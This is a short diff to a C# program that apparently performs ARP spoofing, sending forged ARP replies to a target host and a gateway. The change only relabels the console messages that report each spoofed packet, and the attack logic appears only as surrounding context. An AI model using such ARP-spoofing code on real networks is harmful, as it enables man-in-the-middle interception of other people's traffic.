@@ -54,7 +54,7 @@ class Program
                 device.SendPacket(ethernetPacket);
 
                 Console.ForegroundColor = ConsoleColor.Green;
-                Console.WriteLine("--- [SPOOFED REPLY TO {0}] ARP Packet sent ---", targetIp);
+                Console.WriteLine("--- [SPOOFED REPLY TO TARGET {0}] ARP Packet sent ---", targetIp);
                 Console.ResetColor();
 
                 var arpReplyToGateway = new ArpPacket(
@@ -69,7 +69,7 @@ class Program
                 device.SendPacket(ethernetPacket);
 
                 Console.ForegroundColor = ConsoleColor.Green;
-                Console.WriteLine("--- [SPOOF REPLY TO {0}] ARP Packet sent ---", gatewayIp);
+                Console.WriteLine("--- [SPOOFED REPLY TO GATEWAY {0}] ARP Packet sent ---", gatewayIp);
                 Console.ResetColor();
             }
             catch (Exception ex)
